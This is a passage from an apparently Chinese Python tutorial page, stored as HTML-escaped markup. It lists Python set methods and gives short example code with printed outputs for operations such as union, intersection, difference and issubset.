&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-isdisjoint.html&#34;&gt;isdisjoint()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;判断两个集合是否包含相同的元素，如果没有返回 True，否则返回 False。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-issubset.html&#34;&gt;issubset()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;判断指定集合是否为该方法参数集合的子集。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-issuperset.html&#34;&gt;issuperset()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;判断该方法的参数集合是否为指定集合的子集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-pop.html&#34;&gt;pop()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;随机移除元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-remove.html&#34;&gt;remove()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移除指定元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-symmetric_difference.html&#34;&gt;symmetric_difference()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回两个集合中不重复的元素集合。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-symmetric_difference_update.html&#34;&gt;symmetric_difference_update()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-union.html&#34;&gt;union()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回两个集合的并集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/ref-set-update.html&#34;&gt;update()&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;给集合添加元素&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;函数示例-4&#34;&gt;&lt;a href=&#34;#函数示例-4&#34; class=&#34;headerlink&#34; title=&#34;函数示例&#34;&gt;&lt;/a&gt;函数示例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;orange&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fruits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;, &#39;orange&#39;}&lt;/span&gt;

fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fruits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# set()&lt;/span&gt;

fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;copy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;microsoft&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;difference&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;cherry&#39;, &#39;banana&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;microsoft&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;difference_update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;cherry&#39;, &#39;banana&#39;}&lt;/span&gt;

fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;discard&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fruits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;intersection&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# y 集合不包含 banana 和 cherry，被移除&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;intersection_update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;facebook&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;isdisjoint&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;e&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;issubset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;e&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;b&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;issuperset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;

fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fruits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;cherry&#39;, &#39;banana&#39;}&lt;/span&gt;

fruits &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
fruits&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fruits&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symmetric_difference&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;cherry&#39;, &#39;runoob&#39;, &#39;banana&#39;, &#39;google&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symmetric_difference_update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;cherry&#39;, &#39;runoob&#39;, &#39;banana&#39;, &#39;google&#39;}&lt;/span&gt;

x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;union&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;z&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;, &#39;google&#39;, &#39;runoob&#39;}&lt;/span&gt;

